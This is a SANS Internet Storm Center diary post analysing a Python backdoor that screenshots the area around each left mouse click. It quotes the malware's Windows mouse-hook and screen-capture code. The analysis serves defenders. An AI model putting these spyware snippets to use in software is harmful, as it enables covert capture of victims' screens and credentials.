---
title: A Backdoor with Smart Screenshot Capability, (Thu, Feb 9th)
url: https://isc.sans.edu/diary/rss/29534
source: SANS Internet Storm Center, InfoCON: green
date: 2023-02-10
fetch_date: 2025-10-04T06:16:01.968191
---

# A Backdoor with Smart Screenshot Capability, (Thu, Feb 9th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/29530)
* [next](/diary/29538)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [A Backdoor with Smart Screenshot Capability](/forums/diary/A%2BBackdoor%2Bwith%2BSmart%2BScreenshot%2BCapability/29534/)

**Published**: 2023-02-09. **Last Updated**: 2023-02-09 08:39:31 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/A%2BBackdoor%2Bwith%2BSmart%2BScreenshot%2BCapability/29534/#comments)

Today, everything is “smart” or “intelligent”. We have smartphones, smart cars, smart doorbells, etc. Being "smart" means performing actions depending on the context, the environment, or user actions.

For a while, backdoors and trojans have implemented screenshot capabilities. From an attacker’s point of view, it’s interesting to “see” what’s displayed on the victim’s computer. To take a screenshot in Python is easy as this:

```

import pyautogui
screenshot = pyautogui.screenshot(‘screenshot.png')
```

You have two approaches to record screenshots:

1. On-demand, when the C2 server issues a command like “TAKE\_SCREENSHOT”
2. At regular intervals (every x seconds)

In the first case, the attacker needs to interact with the malware and can miss interesting “screens”. In the second one, the technique will generate a lot of overloads (CPU, storage, bandwidth, …)

Yesterday, I spotted an interesting Python backdoor that implements many classic features (like keylogger, port-scanner, …) but also a “smart” screenshot feature. Why smart? Because a screenshot is taken... when the user clicks on the mouse!

Windows is an event-based operating system. A program can attach to a message bus and listen for specific events (ex: mouse, keyboard, …). When such an event is detected, a defined function is executed (in ASM, you instruct the CPU to jump to a specific location in memory).

How does it work? The attacker defines a “hook” (or a listener) for mouse events:

```

def install_hook(self):
    CMPFUNC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    self.pointer = CMPFUNC(self.hook_proc)
    self.hooked = self.lUser32.SetWindowsHookExA(WH_MOUSE_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
    if not self.hooked:
        return False
    return True
```

The interesting API call is SetWindowsHookExA() combined with the WH\_MOUSE\_LL event type[[1](https://learn.microsoft.com/en-us/windows/win32/winmsg/about-hooks#wh_mouse_ll)]. How to interpret this? From now, when the mouse is used, the program will execute self.pointer (self.hook\_proc).

Here is the called function:

```

def hook_proc(self, nCode, wParam, lParam):
    if wParam == 0x201:
        buf, height, width = self.get_screenshot()
        exe, win_title="unknown", "unknown"
        try:
            exe, win_title=get_current_process()
        except Exception:
            pass
        self.screenshots.append((str(datetime.now()), height, width, exe, win_title, buf.encode('base64')))
   return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
```

The screenshot capture will be triggered when the wParam is 0x201. This value corresponds to a WM\_LBUTTON\_DOWN[[2](https://github.com/mwinapi/mwinapi/blob/master/ManagedWinapi/Hooks/LowLevelHook.cs)] event (when the user presses the left mouse button). Note the function calls CallNextHookEx() to continue to listen to events.

Even better, the attacker does not capture a full screenshot but only the interesting area (where the victim clicked)

```

def get_screenshot(self):
    pos = queryMousePosition()
    limit_width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
    limit_height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
    limit_left = GetSystemMetrics(SM_XVIRTUALSCREEN)
    limit_top = GetSystemMetrics(SM_YVIRTUALSCREEN)
    height = min(100,limit_height)
    width = min(200,limit_width)
    left = max(pos['x']-100,limit_left)
    top = max(pos['y']-50,limit_top)
    ...
```

I find this technique clever because the attacker increases the chances of seeing juivy information around the mouse. Example:

![](https://isc.sans.edu/diaryimages/images/isc-20230209-1.png)

The file SHA256 is 34000abaac50ac84d493d2e55b6fb002fe06920b344f02ee55ff77e725793981[[3](https://bazaar.abuse.ch/sample/34000abaac50ac84d493d2e55b6fb002fe06920b344f02ee55ff77e725793981/)] and has a low VT score (only 6/60).

[1] <https://learn.microsoft.com/en-us/windows/win32/winmsg/about-hooks#wh_mouse_ll>
[2] <https://github.com/mwinapi/mwinapi/blob/master/ManagedWinapi/Hooks/LowLevelHook.cs>
[3] <https://bazaar.abuse.ch/sample/34000abaac50ac84d493d2e55b6fb002fe06920b344f02ee55ff77e725793981/>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Malware](/tag.html?tag=Malware) [Screenshot](/tag.html?tag=Screenshot) [Backdoor](/tag.html?tag=Backdoor) [Python](/tag.html?tag=Python) [Hook](/tag.html?tag=Hook) [Windows](/tag.html?tag=Windows)

[0 comment(s)](/diary/A%2BBackdoor%2Bwith%2BSmart%2BScreenshot%2BCapability/29534/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/29530)
* [next](/diary/29538)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)